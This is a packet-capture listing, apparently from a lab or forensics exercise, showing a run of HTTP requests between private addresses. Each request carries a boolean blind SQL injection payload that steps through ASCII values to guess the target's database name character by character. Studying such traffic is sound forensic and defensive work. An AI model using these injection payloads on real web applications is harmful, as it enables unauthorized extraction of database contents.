No.	Time	Source	Destination	Protocol	Length	Info
1170	48.723874	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),2,1)))=62%23 HTTP/1.1 
1180	48.727865	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),2,1)))=63%23 HTTP/1.1 
1190	48.731575	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),2,1)))=64%23 HTTP/1.1 
1200	48.735213	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),2,1)))=65%23 HTTP/1.1 
1210	48.738938	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),2,1)))=66%23 HTTP/1.1 
1220	48.742626	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),2,1)))=67%23 HTTP/1.1 
1230	48.746379	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),2,1)))=68%23 HTTP/1.1 
1240	48.750163	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),2,1)))=69%23 HTTP/1.1 
1250	48.753788	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),2,1)))=70%23 HTTP/1.1 
1260	48.757399	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),2,1)))=71%23 HTTP/1.1 
1270	48.761071	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),2,1)))=72%23 HTTP/1.1 
1280	48.764890	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),2,1)))=73%23 HTTP/1.1 
1290	48.768942	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),2,1)))=74%23 HTTP/1.1 
1300	48.772570	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),2,1)))=75%23 HTTP/1.1 
